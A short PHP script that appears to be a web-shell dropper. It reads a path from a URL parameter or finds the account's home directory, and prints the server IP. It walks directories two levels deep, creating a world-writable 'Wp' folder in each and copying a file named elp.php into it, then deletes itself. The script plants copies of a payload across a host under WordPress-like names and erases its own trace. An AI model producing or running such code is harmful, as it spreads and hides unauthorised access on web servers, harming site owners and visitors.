<?php
/////////////Getting home dir //////////////
if(!function_exists('posix_getpwuid')){
   if(isset($_GET["path"])){
     $home=$_GET["path"];
   }else{
     echo getcwd();
     die("<br>posix function is not available<br>Please Input Path");
   }
}else{
echo $_SERVER['SERVER_ADDR'];
echo "<br>";

        if(isset($_GET["path"])){
           $home=$_GET["path"];
        }else{
        $arr = posix_getpwuid(posix_getuid());
        $home = $arr["dir"];
        }
}


///////////Making directory & copy file//////////////  
$filepath=getcwd()."/elp.php"; 

  $dirlist = getFileList($home, TRUE, 2);
  foreach($dirlist as $alldir){
    mkdir($alldir."Wp", 0777, TRUE);
    if(copy($filepath, $alldir."Wp/elp.php")) {
     echo $alldir."Wp/elp.php<br>";}
  }
  
  //////////////Directory scanner////////////////
  function getFileList($dir, $recurse = FALSE, $depth = FALSE)
  {
    $retval = [];
    if(substr($dir, -1) != "/") {
      $dir .= "/";
    }
    $d = @dir($dir) or die("Failed open directory $dir");
    while(FALSE !== ($entry = $d->read())) {
      // skip hidden files
      if($entry[0] == "."){
	 continue;
	}
      if(is_dir("$dir$entry")) {
        $retval[] = "$dir$entry/";
        if($recurse && is_readable("$dir$entry/")) {
          if($depth === FALSE) {
            $retval = array_merge($retval, getFileList("$dir$entry/", TRUE));
          } elseif($depth > 0) {
            $retval = array_merge($retval, getFileList("$dir$entry/", TRUE, $depth-1));
          }
        }
      }
    }
    $d->close();

    return $retval;
  }
unlink(__FILE__);